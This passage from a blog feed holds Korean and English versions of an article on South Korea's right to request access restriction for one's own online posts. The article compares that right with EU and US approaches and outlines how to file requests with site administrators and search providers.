&#xC0AC;&#xAC74;&#xC774; &#xC788;&#xC5B4;&#xC694;.</p><ul><li><strong>&#xAD6C;&#xAE00; &#xC2A4;&#xD398;&#xC778; &#xC0AC;&#xAC74;(2014)</strong>: &#xC2A4;&#xD398;&#xC778;&#xC758; &#xD55C; &#xB0A8;&#xC131;&#xC774; &#xACFC;&#xAC70; &#xCC44;&#xBB34; &#xAD00;&#xB828; &#xC815;&#xBCF4;&#xAC00; &#xAD6C;&#xAE00; &#xAC80;&#xC0C9; &#xACB0;&#xACFC;&#xC5D0; &#xB178;&#xCD9C;&#xB418;&#xB294; &#xAC83;&#xC744; &#xBB38;&#xC81C; &#xC0BC;&#xC544; &#xC0AD;&#xC81C;&#xB97C; &#xC694;&#xCCAD;&#xD55C; &#xC0AC;&#xAC74;&#xC5D0;&#xC11C; &#xC720;&#xB7FD;&#xC0AC;&#xBC95;&#xC7AC;&#xD310;&#xC18C;&#xB294; &#xAC1C;&#xC778;&#xC774; &#xD2B9;&#xC815; &#xC815;&#xBCF4;&#xC5D0; &#xB300;&#xD55C; &#xAC80;&#xC0C9; &#xACB0;&#xACFC; &#xC0AD;&#xC81C;&#xB97C; &#xC694;&#xCCAD;&#xD560; &#xC218; &#xC788;&#xB2E4;&#xACE0; &#xD310;&#xACB0;&#xD588;&#xC5B4;&#xC694;.</li></ul><p>&#xC720;&#xB7FD;&#xC5F0;&#xD569;&#xC5D0;&#xC11C;&#xB294; &#xC790;&#xAE30;&#xAC8C;&#xC2DC;&#xBB3C; &#xC811;&#xADFC;&#xBC30;&#xC81C;&#xC694;&#xCCAD;&#xAD8C;&#xACFC; &#xC720;&#xC0AC;&#xD55C; &#xAC1C;&#xB150;&#xC744; &#xAC00;&#xC9C0;&#xACE0; &#xC788;&#xC9C0;&#xB9CC;, &#xC720;&#xB7FD;&#xC5D0;&#xC11C;&#xB294; &#xAC1C;&#xC778;&#xC758; <strong>&#xC815;&#xBCF4; &#xBCF4;&#xD638;</strong>&#xB97C; &#xB354; &#xAC15;&#xC870;&#xD558;&#xB294; &#xBC95;&#xC801; &#xD658;&#xACBD;&#xC774;&#xC5D0;&#xC694;.</p><h3 id="&#xBBF8;&#xAD6D;-&#xD45C;&#xD604;&#xC758;-&#xC790;&#xC720;-&#xC911;&#xC2EC;"><a href="#&#xBBF8;&#xAD6D;-&#xD45C;&#xD604;&#xC758;-&#xC790;&#xC720;-&#xC911;&#xC2EC;" class="headerlink" title="&#xBBF8;&#xAD6D;: &#xD45C;&#xD604;&#xC758; &#xC790;&#xC720; &#xC911;&#xC2EC;"></a><strong>&#xBBF8;&#xAD6D;: &#xD45C;&#xD604;&#xC758; &#xC790;&#xC720; &#xC911;&#xC2EC;</strong></h3><p>&#xBBF8;&#xAD6D;&#xC740; &#x2018;&#xC78A;&#xD790; &#xAD8C;&#xB9AC;&#x2019;&#xAC00; &#xBC95;&#xC801;&#xC73C;&#xB85C; &#xBCF4;&#xC7A5;&#xB418;&#xC9C0; &#xC54A;&#xC9C0;&#xB9CC;, &#xAC01; &#xB514;&#xC9C0;&#xD138; &#xD50C;&#xB7AB;&#xD3FC;&#xC5D0;&#xC11C; &#xC0AC;&#xC6A9;&#xC790;&#xC5D0;&#xAC8C; &#xAC8C;&#xC2DC;&#xBB3C; &#xC0AD;&#xC81C; &#xAE30;&#xB2A5;&#xC744; &#xC81C;&#xACF5;&#xD558;&#xACE0; &#xC788;&#xC5B4;&#xC694;. &#xC608;&#xB97C; &#xB4E4;&#xC5B4;, <strong>&#xD398;&#xC774;&#xC2A4;&#xBD81;</strong>&#xC774;&#xB098; <strong>&#xD2B8;&#xC704;&#xD130;</strong>&#xC640; &#xAC19;&#xC740; SNS &#xD50C;&#xB7AB;&#xD3FC;&#xC740; &#xC0AC;&#xC6A9;&#xC790;&#xAC00; &#xC790;&#xC2E0;&#xC758; &#xAC8C;&#xC2DC;&#xBB3C;&#xC744; &#xC5B8;&#xC81C;&#xB4E0;&#xC9C0; &#xC0AD;&#xC81C;&#xD560; &#xC218; &#xC788;&#xB3C4;&#xB85D; &#xD5C8;&#xC6A9;&#xD558;&#xACE0; &#xC788;&#xC5B4;&#xC694;. &#xD558;&#xC9C0;&#xB9CC; &#xBBF8;&#xAD6D;&#xC5D0;&#xC11C;&#xB294; <strong>&#xD45C;&#xD604;&#xC758; &#xC790;&#xC720;</strong>&#xAC00; &#xC911;&#xC694;&#xC2DC;&#xB418;&#xBBC0;&#xB85C;, &#xACF5;&#xC801; &#xC778;&#xBB3C;&#xC758; &#xAC8C;&#xC2DC;&#xBB3C;&#xC774;&#xB098; &#xACF5;&#xC775;&#xC801;&#xC778; &#xB0B4;&#xC6A9;&#xC5D0; &#xB300;&#xD574;&#xC11C;&#xB294; &#xC0AD;&#xC81C;&#xAC00; &#xC81C;&#xD55C;&#xB420; &#xC218; &#xC788;&#xC5B4;&#xC694;.</p><div class="table-container"><table><thead><tr><th>&#xAD6C;&#xBD84;</th><th>&#xAD6D;&#xB0B4; &#xC790;&#xAE30;&#xAC8C;&#xC2DC;&#xBB3C; &#xC811;&#xADFC;&#xBC30;&#xC81C;&#xC694;&#xCCAD;&#xAD8C;</th><th>&#xC720;&#xB7FD;&#xC5F0;&#xD569;(EU)</th><th>&#xBBF8;&#xAD6D;</th></tr></thead><tbody><tr><td>&#xC801;&#xC6A9; &#xBC94;&#xC704;</td><td>&#xBCF8;&#xC778;&#xC774; &#xC791;&#xC131;&#xD55C; &#xAC8C;&#xC2DC;&#xBB3C;</td><td>&#xC81C;3&#xC790;&#xAC00; &#xC62C;&#xB9B0; &#xC815;&#xBCF4; &#xD3EC;&#xD568;</td><td>&#xC77C;&#xBD80; &#xAC1C;&#xC778;&#xC815;&#xBCF4; &#xBCF4;&#xD638;&#xBC95; &#xC801;&#xC6A9;</td></tr><tr><td>&#xC0AD;&#xC81C; &#xBC29;&#xC2DD;</td><td>&#xAC80;&#xC0C9; &#xC81C;&#xD55C;(&#xAC8C;&#xC2DC;&#xBB3C;&#xC740; &#xB0A8;&#xC544; &#xC788;&#xC74C;)</td><td>&#xAC80;&#xC0C9; &#xACB0;&#xACFC; &#xC0AD;&#xC81C; &#xBC0F; &#xC815;&#xBCF4; &#xC0AD;&#xC81C; &#xAC00;&#xB2A5;</td><td>&#xC81C;&#xD55C;&#xC801; &#xC0AD;&#xC81C; &#xAC00;&#xB2A5;</td></tr><tr><td>&#xBC95;&#xC801; &#xADFC;&#xAC70;</td><td>&#xC815;&#xBCF4;&#xD1B5;&#xC2E0;&#xB9DD;&#xBC95;</td><td>GDPR, &#xC720;&#xB7FD;&#xC0AC;&#xBC95;&#xC7AC;&#xD310;&#xC18C; &#xD310;&#xB840;</td><td>&#xD45C;&#xD604;&#xC758; &#xC790;&#xC720; &#xC6D0;&#xCE59;, &#xC77C;&#xBD80; &#xC8FC; &#xBC95;&#xB960;</td></tr></tbody></table></div><h1 id="2-&#xC774;&#xC6A9;&#xC790;-&#xBCF8;&#xC778;&#xC758;-&#xC811;&#xADFC;&#xBC30;&#xC81C;-&#xC694;&#xCCAD;-&#xBC29;&#xBC95;-&#xBC0F;-&#xC808;&#xCC28;"><a href="#2-&#xC774;&#xC6A9;&#xC790;-&#xBCF8;&#xC778;&#xC758;-&#xC811;&#xADFC;&#xBC30;&#xC81C;-&#xC694;&#xCCAD;-&#xBC29;&#xBC95;-&#xBC0F;-&#xC808;&#xCC28;" class="headerlink" title="2. &#xC774;&#xC6A9;&#xC790; &#xBCF8;&#xC778;&#xC758; &#xC811;&#xADFC;&#xBC30;&#xC81C; &#xC694;&#xCCAD; &#xBC29;&#xBC95; &#xBC0F; &#xC808;&#xCC28;"></a>2. &#xC774;&#xC6A9;&#xC790; &#xBCF8;&#xC778;&#xC758; &#xC811;&#xADFC;&#xBC30;&#xC81C; &#xC694;&#xCCAD; &#xBC29;&#xBC95; &#xBC0F; &#xC808;&#xCC28;</h1><p>&#xADF8;&#xB807;&#xB2E4;&#xBA74;, &#xAD6D;&#xB0B4;&#xC5D0;&#xC11C; &#xC790;&#xAE30;&#xAC8C;&#xC2DC;&#xBB3C; &#xC811;&#xADFC;&#xBC30;&#xC81C;&#xC694;&#xCCAD;&#xAD8C;&#xC740; &#xC5B4;&#xB5BB;&#xAC8C; &#xC2E0;&#xCCAD;&#xD558;&#xACE0; &#xC5B4;&#xB5A4; &#xACFC;&#xC815;&#xC73C;&#xB85C; &#xCC98;&#xB9AC;&#xB418;&#xB294;&#xC9C0; &#xC54C;&#xC544;&#xBCFC;&#xAC8C;&#xC694;.</p><ul><li><p>&#xAD8C;&#xB9AC;&#xD589;&#xC0AC; &#xB300;&#xC0C1;</p><p>&#xC815;&#xBCF4;&#xD1B5;&#xC2E0;&#xB9DD;&#xC744; &#xD1B5;&#xD574; <strong>&#xBCF8;&#xC778;&#xC774;</strong> &#xAC8C;&#xC2DC;&#xD55C; &#xAE00;(&#xB313;&#xAE00;), &#xC0AC;&#xC9C4;, &#xB3D9;&#xC601;&#xC0C1; &#xBC0F; &#xC774;&#xC5D0; &#xC900;&#xD558;&#xB294; &#xAC8C;&#xC2DC;&#xBB3C;&#xC5D0; &#xB300;&#xD574;&#xC11C; &#xAD8C;&#xB9AC;&#xB97C; &#xD589;&#xC0AC;&#xD560; &#xC218; &#xC788;&#xC5B4;&#xC694;. &#xB9CC;&#xC57D; &#xACE0;&#xC778;&#xC774; &#xC0DD;&#xC804;&#xC5D0; &#xAD8C;&#xB9AC;&#xB97C; &#xC704;&#xC784;&#xD55C; <strong>&#xC9C0;&#xC815;&#xC778;</strong> &#xB610;&#xB294; &#xACE0;&#xC778;&#xC758; <strong>&#xC720;&#xC871;</strong>&#xC774; &#xC811;&#xADFC;&#xBC30;&#xC81C;&#xB97C; &#xC694;&#xCCAD;&#xD558;&#xB294; &#xACBD;&#xC6B0;&#xC5D0;&#xB3C4; &#xAD8C;&#xB9AC;&#xB97C; &#xD589;&#xC0AC;&#xD560; &#xC218; &#xC788;&#xC5B4;&#xC694;. &#xC9C0;&#xC815;&#xC778;&#xACFC; &#xC720;&#xC871;&#xC758; &#xC758;&#xACAC;&#xC774; &#xB2E4;&#xB978; &#xACBD;&#xC6B0;&#xC5D0;&#xB294; &#xD2B9;&#xBCC4;&#xD55C; &#xC0AC;&#xC815;&#xC774; &#xC5C6;&#xB294; &#xD55C; &#xC9C0;&#xC815;&#xC778;&#xC758; &#xC758;&#xACAC;&#xC744; &#xB530;&#xB77C;&#xC694;.<br><img src="/2025/02/22/romi0x/right-to-be-forgotten-ko/image2.png" alt="&#xC0AC;&#xC9C4;"></p></li><li><p>&#xAD8C;&#xB9AC;&#xD589;&#xC0AC; &#xC8FC;&#xCCB4; &#xBC0F; &#xC0C1;&#xB300;&#xBC29;</p><p>&#xAD8C;&#xB9AC;&#xB97C; &#xD589;&#xC0AC;&#xD558;&#xB294; &#xC8FC;&#xCCB4;&#xB294; <strong>&#xB204;&#xAD6C;&#xB4E0;&#xC9C0;</strong> &#xAC00;&#xB2A5;&#xD558;&#xBA70; &#xADF8; &#xC0C1;&#xB300;&#xB294; <strong>&#xAC8C;&#xC2DC;&#xD310; &#xAD00;&#xB9AC;&#xC790;</strong> &#xB610;&#xB294; <strong>&#xAC80;&#xC0C9;&#xC11C;&#xBE44;&#xC2A4; &#xC0AC;&#xC5C5;&#xC790;</strong>&#xC608;&#xC694;.<br><img src="/2025/02/22/romi0x/right-to-be-forgotten-ko/image3.png" alt="&#xC0AC;&#xC9C4;"></p></li><li><p>&#xC694;&#xCCAD; &#xBC29;&#xBC95; &#xBC0F; &#xC808;&#xCC28;</p><p>&#xC694;&#xCCAD;&#xD558;&#xB294; &#xBC29;&#xBC95;&#xACFC; &#xC808;&#xCC28;&#xB294; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC544;&#xC694;.</p><ol><li>&#xC774;&#xC6A9;&#xC790; &#xBCF8;&#xC778;&#xC774; <strong>&#xC9C1;&#xC811;</strong> &#xD574;&#xB2F9; &#xAC8C;&#xC2DC;&#xBB3C;&#xC744; &#xC0AD;&#xC81C;&#xD560; &#xC218; &#xC788;&#xB294;&#xC9C0; &#xD655;&#xC778;&#xD574;&#xC694;.<ul><li>&#xC774;&#xC6A9;&#xC790; &#xBCF8;&#xC778;&#xC774; &#xC9C1;&#xC811; &#xC0AD;&#xC81C;&#xD560; &#xC218; &#xC788;&#xB2E4;&#xBA74;, &#xC0AC;&#xC5C5;&#xC790;&#xB294; &#xC790;&#xAE30;&#xAC8C;&#xC2DC;&#xBB3C; &#xC811;&#xADFC;&#xBC30;&#xC81C;&#xC694;&#xCCAD;&#xC744; &#xAC70;&#xBD80;&#xD560; &#xC218; &#xC788;&#xC5B4;&#xC694;.</li></ul></li><li><p>&#xC774;&#xC6A9;&#xC790;&#xAC00; &#xC9C1;&#xC811; &#xC0AD;&#xC81C;&#xD558;&#xAE30; &#xC5B4;&#xB835;&#xB2E4;&#xBA74;, <strong>&#xAC8C;&#xC2DC;&#xD310; &#xAD00;&#xB9AC;&#xC790;&#xC5D0;&#xAC8C; &#xC790;&#xAE30;&#xAC8C;&#xC2DC;&#xBB3C;&#xC758; &#xC811;&#xADFC;&#xBC30;&#xC81C;&#xB97C; &#xC694;&#xCCAD;</strong>&#xD574;&#xC694;.<br>&#xC774;&#xB54C;, &#xC694;&#xCCAD; &#xC2DC; &#xC785;&#xC99D; &#xC790;&#xB8CC;&#xB4E4;&#xC744; &#xCCA8;&#xBD80;&#xD574;&#xC57C; &#xD574;&#xC694;.</p><ul><li>&#xC811;&#xADFC;&#xBC30;&#xC81C;&#xB97C; &#xC6D0;&#xD558;&#xB294; &#xAC8C;&#xC2DC;&#xBB3C; &#xBC0F; &#xAC8C;&#xC2DC;&#xBB3C;&#xC758; &#xC704;&#xCE58;&#xC790;&#xB8CC;(URL)</li><li>&#xC694;&#xCCAD;&#xC778;&#xC774; &#xD574;&#xB2F9; &#xAC8C;&#xC2DC;&#xBB3C;&#xC744; &#xAC8C;&#xC2DC;&#xD558;&#xC600;&#xB2E4;&#xB294; &#xC0AC;&#xC2E4;&#xC744; &#xC785;&#xC99D;&#xD560; &#xC218; &#xC788;&#xB294; &#xC790;&#xB8CC; </li><li>&#xC811;&#xADFC;&#xBC30;&#xC81C;&#xB97C; &#xC694;&#xCCAD;&#xD558;&#xB294; &#xC0AC;&#xC720;</li></ul></li><li><p><strong>&#xAC80;&#xC0C9;&#xC11C;&#xBE44;&#xC2A4; &#xC0AC;&#xC5C5;&#xC790;&#xC5D0;&#xAC8C; &#xAC80;&#xC0C9;&#xBAA9;&#xB85D;&#xC758; &#xBC30;&#xC81C;</strong>&#xB97C; &#xCD94;&#xAC00;&#xC801;&#xC73C;&#xB85C; &#xC6D0;&#xD55C;&#xB2E4;&#xBA74;, &#xAC8C;&#xC2DC;&#xD310; &#xAD00;&#xB9AC;&#xC790;&#xC758; &#xC811;&#xADFC;&#xBC30;&#xC81C; &#xC870;&#xCE58; &#xC0AC;&#xC2E4;&#xC744; &#xC785;&#xC99D;&#xD560; &#xC218; &#xC788;&#xB294; &#xC790;&#xB8CC;&#xB97C; &#xCCA8;&#xBD80;&#xD574; &#xAC80;&#xC0C9;&#xC11C;&#xBE44;&#xC2A4; &#xC0AC;&#xC5C5;&#xC790;&#xC5D0;&#xAC8C; &#xAC80;&#xC0C9;&#xBAA9;&#xB85D; &#xBC30;&#xC81C; &#xC694;&#xCCAD;&#xC744; &#xD574;&#xC694;.</p></li></ol></li></ul><h1 id="3-&#xC0AC;&#xC5C5;&#xC790;&#xC758;-&#xC811;&#xADFC;&#xBC30;&#xC81C;-&#xC870;&#xCE58;-&#xBC29;&#xBC95;-&#xBC0F;-&#xC808;&#xCC28;"><a href="#3-&#xC0AC;&#xC5C5;&#xC790;&#xC758;-&#xC811;&#xADFC;&#xBC30;&#xC81C;-&#xC870;&#xCE58;-&#xBC29;&#xBC95;-&#xBC0F;-&#xC808;&#xCC28;" class="headerlink" title="3. &#xC0AC;&#xC5C5;&#xC790;&#xC758; &#xC811;&#xADFC;&#xBC30;&#xC81C; &#xC870;&#xCE58; &#xBC29;&#xBC95; &#xBC0F; &#xC808;&#xCC28;"></a>3. &#xC0AC;&#xC5C5;&#xC790;&#xC758; &#xC811;&#xADFC;&#xBC30;&#xC81C; &#xC870;&#xCE58; &#xBC29;&#xBC95; &#xBC0F; &#xC808;&#xCC28;</h1><p>&#xC774;&#xC6A9;&#xC790;&#xAC00; &#xC811;&#xADFC;&#xBC30;&#xC81C;&#xB97C; &#xC694;&#xCCAD;&#xD588;&#xB2E4;&#xBA74; &#xAC8C;&#xC2DC;&#xD310; &#xAD00;&#xB9AC;&#xC790;&#xC640; &#xAC80;&#xC0C9;&#xC11C;&#xBE44;&#xC2A4; &#xC0AC;&#xC5C5;&#xC790;&#xB294; &#xC5B4;&#xB5A4; &#xBC29;&#xBC95;&#xC73C;&#xB85C; &#xC870;&#xCE58;&#xB97C; &#xD574;&#xC57C;&#xD560;&#xAE4C;&#xC694;?</p><p>&#xC0AC;&#xC5C5;&#xC790;&#xB294; &#xC774;&#xC6A9;&#xC790;&#xC758; &#xC694;&#xCCAD;&#xC744; &#xAC80;&#xD1A0;&#xD55C; &#xD6C4; &#xC801;&#xC808;&#xD55C; &#xC870;&#xCE58;&#xB97C; &#xCDE8;&#xD574;&#xC57C; &#xD574;&#xC694;. &#xAC8C;&#xC2DC;&#xD310; &#xAD00;&#xB9AC;&#xC790;&#xB294; &#xC694;&#xCCAD;&#xC778;&#xC774; &#xC81C;&#xCD9C;&#xD55C; &#xC785;&#xC99D;&#xC790;&#xB8CC;&#xB97C; &#xC885;&#xD569;&#xC801;&#xC73C;&#xB85C; &#xACE0;&#xB824;&#xD574; &#xD574;&#xB2F9; &#xAC8C;&#xC2DC;&#xBB3C;&#xC5D0; &#xB300;&#xD55C; <strong>&#xBE14;&#xB77C;&#xC778;&#xB4DC; &#xCC98;&#xB9AC;</strong> &#xB4F1;&#xC73C;&#xB85C; &#xC811;&#xADFC;&#xBC30;&#xC81C; &#xC870;&#xCE58;&#xB97C; &#xC2E4;&#xC2DC;&#xD574;&#xC57C; &#xD574;&#xC694;. &#xAC80;&#xC0C9;&#xC11C;&#xBE44;&#xC2A4; &#xC0AC;&#xC5C5;&#xC790;&#xB294; &#xAC80;&#xC0C9;&#xBAA9;&#xB85D;&#xC5D0;&#xC11C; &#xBC30;&#xC81C;&#xD558;&#xB294; &#xBC29;&#xC2DD;&#xC73C;&#xB85C; &#xC870;&#xCE58;&#xB97C; &#xCDE8;&#xD574;&#xC57C; &#xD574;&#xC694;.</p><h1 id="4-&#xACB0;&#xACFC;-&#xD1B5;&#xBCF4;-&#xBC0F;-&#xC81C;3&#xC790;&#xC758;-&#xC774;&#xC758;&#xC2E0;&#xCCAD;"><a href="#4-&#xACB0;&#xACFC;-&#xD1B5;&#xBCF4;-&#xBC0F;-&#xC81C;3&#xC790;&#xC758;-&#xC774;&#xC758;&#xC2E0;&#xCCAD;" class="headerlink" title="4. &#xACB0;&#xACFC; &#xD1B5;&#xBCF4; &#xBC0F; &#xC81C;3&#xC790;&#xC758; &#xC774;&#xC758;&#xC2E0;&#xCCAD;"></a>4. &#xACB0;&#xACFC; &#xD1B5;&#xBCF4; &#xBC0F; &#xC81C;3&#xC790;&#xC758; &#xC774;&#xC758;&#xC2E0;&#xCCAD;</h1><p>&#xC0AC;&#xC5C5;&#xC790;&#xB294; &#xC811;&#xADFC;&#xBC30;&#xC81C; &#xC870;&#xCE58;&#xB97C; &#xC644;&#xB8CC;&#xD55C; &#xACBD;&#xC6B0; &#xC694;&#xCCAD;&#xC778;&#xC5D0;&#xAC8C; &#xACB0;&#xACFC;&#xB97C; &#xD1B5;&#xBCF4;&#xD574;&#xC57C; &#xD574;&#xC694;. &#xB610;&#xD55C;, &#xC81C;3&#xC790;&#xAC00; &#xC774;&#xC5D0; &#xB300;&#xD55C; &#xC774;&#xC758;&#xB97C; &#xC81C;&#xAE30;&#xD560; &#xC218; &#xC788;&#xC5B4;&#xC694;. &#xC774; &#xACBD;&#xC6B0;, &#xC0AC;&#xC5C5;&#xC790;&#xB294; &#xC694;&#xCCAD;&#xC778;&#xC758; &#xC785;&#xC99D;&#xC790;&#xB8CC;&#xB97C; &#xAC80;&#xD1A0;&#xD55C; &#xD6C4; &#xC774;&#xC758; &#xC2E0;&#xCCAD;&#xC744; &#xBC1B;&#xC544;&#xB4E4;&#xC77C;&#xC9C0; &#xACB0;&#xC815;&#xD574;&#xC57C; &#xD574;&#xC694;.</p><p>&#xAD6D;&#xB0B4; &#xC720;&#xBA85; &#xD3EC;&#xD138;&#xC0AC;&#xC774;&#xD2B8; N&#xC0AC;&#xC640; D&#xC0AC;&#xB3C4; &#xC790;&#xAE30;&#xAC8C;&#xC2DC;&#xBB3C; &#xC811;&#xADFC;&#xBC30;&#xC81C; &#xC694;&#xCCAD;&#xAD8C;&#xC744; &#xC548;&#xB0B4;&#xD558;&#xACE0; &#xC788;&#xC5B4;&#xC694;.</p><ul><li><p>N&#xC0AC;&#xC758; &#xC790;&#xAE30;&#xAC8C;&#xC2DC;&#xBB3C; &#xC811;&#xADFC;&#xBC30;&#xC81C; &#xC694;&#xCCAD; &#xC548;&#xB0B4;</p><p><a href="https://help.naver.com/service/30001/category/5759?lang=ko">https://help.naver.com/service/30001/category/5759?lang=ko</a></p></li><li><p>D&#xC0AC;&#xC758; &#xC790;&#xAE30;&#xAC8C;&#xC2DC;&#xBB3C; &#xC811;&#xADFC;&#xBC30;&#xC81C; &#xC694;&#xCCAD; &#xC548;&#xB0B4;</p><p><a href="https://cs.daum.net/redbell/right/precludeProcess.html">https://cs.daum.net/redbell/right/precludeProcess.html</a></p></li></ul><h3 id="Ref"><a href="#Ref" class="headerlink" title="Ref"></a>Ref</h3><p><a href="https://www.pipc.go.kr/np/cop/bbs/selectBoardArticle.do?bbsId=BS217&amp;mCode=D010030000&amp;nttId=10895#LINK">&#xAC1C;&#xC778;&#xC815;&#xBCF4;&#xBCF4;&#xD638;&#xC704;&#xC6D0;&#xD68C; &#x300C;&#xC778;&#xD130;&#xB137; &#xC790;&#xAE30;&#xAC8C;&#xC2DC;&#xBB3C; &#xC811;&#xADFC;&#xBC30;&#xC81C;&#xC694;&#xCCAD;&#xAD8C; &#xC548;&#xB0B4;&#xC11C;&#x300D; 2024.12</a></p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/Research/">Research</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/romi0x/">romi0x</category>
      
      <category domain="https://hackyboiz.github.io/tags/research/">research</category>
      
      <category domain="https://hackyboiz.github.io/tags/right/">right</category>
      
      
      <comments>https://hackyboiz.github.io/2025/02/22/romi0x/right-to-be-forgotten-ko/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[Research] Korea’s Right to Be Forgotten: Right to Request Access Restriction for Personal Online Posts (en)</title>
      <link>https://hackyboiz.github.io/2025/02/22/romi0x/right-to-be-forgotten-en/</link>
      <guid>https://hackyboiz.github.io/2025/02/22/romi0x/right-to-be-forgotten-en/</guid>
      <pubDate>Sat, 22 Feb 2025 08:00:00 GMT</pubDate>
      
        
        
      <description>&lt;p&gt;Hello, this is romi0x!&lt;/p&gt;
&lt;p&gt;Have you ever wanted to erase embarrassing moments from the internet? Or have you tried to delete a post bu</description>
        
      
      
      
      <content:encoded><![CDATA[<p>Hello, this is romi0x!</p><p>Have you ever wanted to erase embarrassing moments from the internet? Or have you tried to delete a post but couldn&#x2019;t find a way to remove it? Sometimes, you may not be able to delete your posts because there is no delete button or you are no longer a member of the service. To address this issue, there is a legal right called the <strong>&#x201C;Right to Request Access Restriction for Personal Online Posts.&#x201D;</strong></p><p>In this article, I will introduce the <strong>&#x201C;Right to Request Access Restriction for Personal Online Posts&#x201D;</strong>, which allows individuals to request restrictions on public access to posts they have uploaded.</p><p><img src="/2025/02/22/romi0x/right-to-be-forgotten-en/index.png" alt="pic"></p><h2 id="1-What-is-the-Right-to-Request-Access-Restriction-for-Personal-Online-Posts"><a href="#1-What-is-the-Right-to-Request-Access-Restriction-for-Personal-Online-Posts" class="headerlink" title="1. What is the Right to Request Access Restriction for Personal Online Posts?"></a><strong>1. What is the Right to Request Access Restriction for Personal Online Posts?</strong></h2><p>The <strong>&#x201C;Right to Request Access Restriction for Personal Online Posts&#x201D;</strong> allows individuals to request restrictions on access to their own posts on the internet. This right ensures that information and communication service providers, as personal data controllers, comply with privacy protection principles, while allowing users to safeguard their personal data.</p><p>Since 2016, South Korea has introduced this right under the <strong>Act on Promotion of Information and Communications Network Utilization and Information Protection (the Information and Communications Network Act)</strong>. Under this system, individuals can request <strong>access restrictions</strong> rather than <strong>deletion</strong> of their posts.</p><p><img src="/2025/02/22/romi0x/right-to-be-forgotten-en/image1.png" alt="pic"></p><h2 id="1-2-Comparison-with-Global-Cases"><a href="#1-2-Comparison-with-Global-Cases" class="headerlink" title="1-2. Comparison with Global Cases"></a><strong>1-2. Comparison with Global Cases</strong></h2><p>When it comes to online information deletion requests, South Korea&#x2019;s <strong>Right to Request Access Restriction for Personal Online Posts</strong> and the globally recognized <strong>&#x201C;Right to Be Forgotten&#x201D;</strong> share similar goals but differ in legal application and scope.</p><h3 id="European-Union-EU-Right-to-Be-Forgotten"><a href="#European-Union-EU-Right-to-Be-Forgotten" class="headerlink" title="European Union (EU): Right to Be Forgotten"></a><strong>European Union (EU): Right to Be Forgotten</strong></h3><p>In the European Union, there is a legal right called the <strong>&#x201C;Right to Be Forgotten.&#x201D;</strong> This right was officially recognized in 2014 following a ruling by the <strong>Court of Justice of the European Union (CJEU)</strong> in the <strong>Google Spain case</strong>. The <strong>General Data Protection Regulation (GDPR)</strong>, which took effect in 2018, explicitly defines this right.</p><p>One major case highlighting this right is:</p><ul><li><strong>Google Spain Case (2014)</strong>: A Spanish man requested the removal of search results linking to outdated debt-related information. The CJEU ruled that individuals have the right to request the removal of specific search results.</li></ul><p>While the EU shares similarities with Korea&#x2019;s system, European laws place a stronger emphasis on <strong>personal data protection</strong>.</p><h3 id="United-States-Focus-on-Freedom-of-Expression"><a href="#United-States-Focus-on-Freedom-of-Expression" class="headerlink" title="United States: Focus on Freedom of Expression"></a><strong>United States: Focus on Freedom of Expression</strong></h3><p>The <strong>Right to Be Forgotten</strong> is not legally recognized in the United States. Instead, digital platforms offer users the ability to delete their own posts. For example, social media platforms like <strong>Facebook</strong> and <strong>Twitter</strong> allow users to remove their posts at any time. However, due to the strong emphasis on <strong>freedom of expression</strong>, content related to public figures or issues of public interest may not be easily removed.</p><div class="table-container"><table><thead><tr><th>Category</th><th>South Korea (Right to Request Access Restriction)</th><th>European Union (Right to Be Forgotten)</th><th>United States</th></tr></thead><tbody><tr><td>Scope</td><td>Posts made by the individual</td><td>Includes third-party content</td><td>Limited personal data protection laws</td></tr><tr><td>Deletion Process</td><td>Search restriction (post remains)</td><td>Search result removal &amp; content deletion possible</td><td>Limited removal possible</td></tr><tr><td>Legal Basis</td><td>Information and Communications Network Act</td><td>GDPR, CJEU rulings</td><td>Freedom of Expression, some state laws</td></tr></tbody></table></div><h2 id="2-How-to-Request-Access-Restriction-for-Your-Own-Posts"><a href="#2-How-to-Request-Access-Restriction-for-Your-Own-Posts" class="headerlink" title="2. How to Request Access Restriction for Your Own Posts"></a><strong>2. How to Request Access Restriction for Your Own Posts</strong></h2><p>So, how can individuals in South Korea exercise this right and request access restrictions on their posts?</p><h3 id="Eligible-Requests"><a href="#Eligible-Requests" class="headerlink" title="Eligible Requests"></a><strong>Eligible Requests</strong></h3><p>Users can exercise this right for posts they have made on <strong>online platforms, including comments, photos, and videos</strong>. If a <strong>deceased individual has designated a representative</strong> or if the <strong>family of the deceased</strong> requests access restriction, the request can still be made. If the designated representative and the family have differing opinions, the designated representative&#x2019;s decision generally takes precedence.</p><p><img src="/2025/02/22/romi0x/right-to-be-forgotten-en/image2.png" alt="pic"></p><h3 id="Who-Can-Submit-a-Request-and-Who-is-Responsible"><a href="#Who-Can-Submit-a-Request-and-Who-is-Responsible" class="headerlink" title="Who Can Submit a Request and Who is Responsible?"></a><strong>Who Can Submit a Request and Who is Responsible?</strong></h3><p>Any individual can submit a request, and it should be directed to the <strong>website administrator</strong> or <strong>search engine provider</strong>.</p><p><img src="/2025/02/22/romi0x/right-to-be-forgotten-en/image3.png" alt="pic"></p><h3 id="Steps-to-Request-Access-Restriction"><a href="#Steps-to-Request-Access-Restriction" class="headerlink" title="Steps to Request Access Restriction"></a><strong>Steps to Request Access Restriction</strong></h3><ol><li><strong>Check if you can delete the post yourself.</strong><ul><li>If the user can delete their own post, the platform operator may refuse the request for access restriction.</li></ul></li><li><strong>If self-deletion is not possible, request access restriction from the website administrator.</strong><ul><li>Supporting documents should be submitted along with the request.</li><li>Required documents include:<ul><li>The <strong>URL of the post</strong> in question.</li><li>Proof that the requester originally posted the content.</li><li>A <strong>statement of reasons</strong> for the access restriction request.</li></ul></li></ul></li><li><strong>If further action is needed, request removal from search engine providers.</strong><ul><li>To do this, users must provide evidence that the website administrator has already restricted access.</li></ul></li></ol><h2 id="3-How-Service-Providers-Process-Access-Restriction-Requests"><a href="#3-How-Service-Providers-Process-Access-Restriction-Requests" class="headerlink" title="3. How Service Providers Process Access Restriction Requests"></a><strong>3. How Service Providers Process Access Restriction Requests</strong></h2><p>Once a request is made, <strong>website administrators</strong> and <strong>search engine providers</strong> must follow a review process to determine the appropriate action.</p><ul><li>Website administrators will <strong>consider the submitted evidence</strong> and apply <strong>access restriction measures</strong>, such as <strong>blurring or blocking access to the post</strong>.</li><li>Search engine providers will <strong>remove the post from search results</strong> where applicable.</li></ul><h2 